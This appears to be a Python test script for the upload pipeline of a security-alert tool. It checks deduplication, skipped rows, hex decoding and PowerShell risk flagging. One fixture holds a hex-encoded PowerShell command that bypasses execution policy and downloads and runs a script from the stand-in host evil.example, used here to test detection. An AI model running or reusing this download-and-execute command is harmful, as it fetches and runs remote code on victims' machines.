import os, sys, io, base64
os.environ["MONGO_URL"] = "mongodb://localhost:27017"
os.environ["DB_NAME"] = "test_albert_gaps2"
os.environ["JWT_SECRET"] = "testsecret"
sys.path.insert(0, ".")

from mongomock_motor import AsyncMongoMockClient
import db as db_module
db_module.client = AsyncMongoMockClient()
db_module.db = db_module.client["test_albert_gaps2"]

import server
import auth_utils
from routes import albert as albert_route
albert_route.db = db_module.db

from fastapi.testclient import TestClient

admin_user = {"id": "u1", "email": "admin@x.com", "role": "admin", "name": "Admin", "teams": []}
app = server.app
app.dependency_overrides[auth_utils.get_current_user] = lambda: admin_user
client = TestClient(app)


def make_xlsx(rows, columns=None):
    import openpyxl
    wb = openpyxl.Workbook()
    ws = wb.active
    cols = columns or [
        "TIME (GMT)", "DEVICE", "ALERT MESSAGE", "SOURCE IP", "DESTINATION IP",
        "SOURCE PORT", "DESTINATION PORT", "PROTOCOL", "STREAM DATA HEX", "STREAM DATA", "STREAM DATA LENGTH",
    ]
    ws.append(cols)
    for r in rows:
        ws.append(r)
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


# ---- PowerShell command as hex, to prove the ingest pipeline decodes it live ----
ps_command = ('%systemroot%\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe -NoLogo -NonInteractive '
              '-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString(\'http://evil.example/x.ps1\')')
ps_hex = ps_command.encode("ascii").hex().upper()

file1 = make_xlsx([
    ["7/13/2026 5:59:53 AM GMT", "sensor-1", "Powershell Activity Over SMB - Likely Lateral Movement",
     "10.0.0.5", "10.0.0.9", 49512, 445, 6, ps_hex, "garbled fallback text", len(ps_hex) // 2],
    # duplicate of the row above (identical natural key) -- should be merged, not double-inserted
    ["7/13/2026 5:59:53 AM GMT", "sensor-1", "Powershell Activity Over SMB - Likely Lateral Movement",
     "10.0.0.5", "10.0.0.9", 49512, 445, 6, ps_hex, "garbled fallback text", len(ps_hex) // 2],
    # unparseable time -> should be skipped with a reason, not crash the batch
    ["not-a-real-timestamp", "sensor-1", "Some Other Alert", "10.0.0.6", "10.0.0.9", 1234, 445, 6, "", "", 0],
    # a row using a date format the strict formats don't cover, exercising the dateutil fallback
    ["2026-07-13 06:15:00", "sensor-1", "Unsupported/Fake FireFox Version", "10.0.0.7", "10.0.0.9", 1235, 80, 6, "", "", 0],
])

r = client.post("/api/v1/admin/albert/upload", files={
    "file": ("sensor1.xlsx", file1, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
})
assert r.status_code == 200, r.text
data = r.json()
print("upload1:", data)
assert data["rows_parsed"] == 2  # PowerShell row + the dateutil-fallback FireFox row; 1 in-file dup merged, 1 skipped
assert data["duplicates_merged"] == 1
assert data["rows_skipped"] == 1
assert data["skip_reasons"].get("unparseable_time") == 1
print("PASS: single upload -- in-file dedup, skip reason tracked, dateutil fallback row survives")

# ---- stream_data_hex decoded live, PowerShell analysis attached to alert detail ----
r = client.get("/api/v1/admin/albert/alerts", params={"q": "PowerShell", "page_size": 5})
assert r.status_code == 200, r.text
items = r.json()["items"]
assert len(items) == 1
alert = items[0]
assert alert["stream_data_source"] == "hex"
assert "PowerShell.exe" in alert["stream_data"]
assert "garbled fallback text" not in alert["stream_data"]
print("PASS: stream data decoded from hex column, not the CIS text column")
print("stream_data:", alert["stream_data"][:150])

r = client.get(f"/api/v1/admin/albert/alerts/{alert['id']}")
assert r.status_code == 200, r.text
detail = r.json()
pa = detail["powershell_analysis"]
assert pa is not None and pa["detected"] is True
assert pa["overall_risk"] in ("High", "Critical")
labels = {i["label"] for i in pa["risk_indicators"]}
assert "Invoke-Expression / IEX" in labels
assert "Remote download" in labels
print("PASS: GET alert detail attaches powershell_analysis with correct risk indicators")
print("plain_summary:", pa["plain_summary"])

# a non-powershell alert should have powershell_analysis = None
firefox_items = client.get("/api/v1/admin/albert/alerts", params={"q": "FireFox"}).json()["items"]
other = firefox_items[0]
r = client.get(f"/api/v1/admin/albert/alerts/{other['id']}")
assert r.json()["powershell_analysis"] is None
print("PASS: non-PowerShell alert has powershell_analysis = None")

# ---- bulk upload: two files, one good, one bad, in the same batch ----
file2 = make_xlsx([
    ["7/14/2026 9:00:00 AM GMT", "sensor-2", "Known External IP Lookup Service Domain in SNI",
     "10.0.0.20", "8.8.8.8", 5000, 443, 6, "", "", 0],
])
bad_file = b"not a real xlsx file at all"

r = client.post("/api/v1/admin/albert/upload/bulk", files=[
    ("files", ("sensor2.xlsx", file2, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")),
    ("files", ("not-really.xlsx", bad_file, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")),
    ("files", ("wrong_ext.txt", b"hello", "text/plain")),
])
assert r.status_code == 200, r.text
bulk = r.json()
print("bulk result:", bulk)
assert bulk["files_processed"] == 3
assert bulk["files_succeeded"] == 1
assert bulk["files_failed"] == 2
assert bulk["totals"]["rows_parsed"] == 1
by_name = {res["filename"]: res for res in bulk["results"]}
assert by_name["sensor2.xlsx"]["ok"] is True
assert by_name["not-really.xlsx"]["ok"] is False
assert by_name["wrong_ext.txt"]["ok"] is False
print("PASS: bulk upload processes multiple files, isolates per-file failures, aggregates totals")

# total alerts across both single + bulk uploads
r = client.get("/api/v1/admin/albert/stats", params={"days": 365})
assert r.json()["total_alerts"] == 3  # 2 unique from file1 + 1 from file2
print("PASS: alerts from both single and bulk uploads are queryable together")

# ---- re-uploading file1 again should now be recognized as fully duplicate ----
r = client.post("/api/v1/admin/albert/upload", files={
    "file": ("sensor1_reupload.xlsx", file1, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
})
assert r.status_code == 200, r.text
data2 = r.json()
assert data2["rows_parsed"] == 0
assert data2["duplicates_merged"] >= 3  # everything in file1 already exists
print("PASS: cross-file/cross-import dedup catches a full re-upload")

print("\nALL ALBERT GAPS ROUND 2 TESTS PASSED")
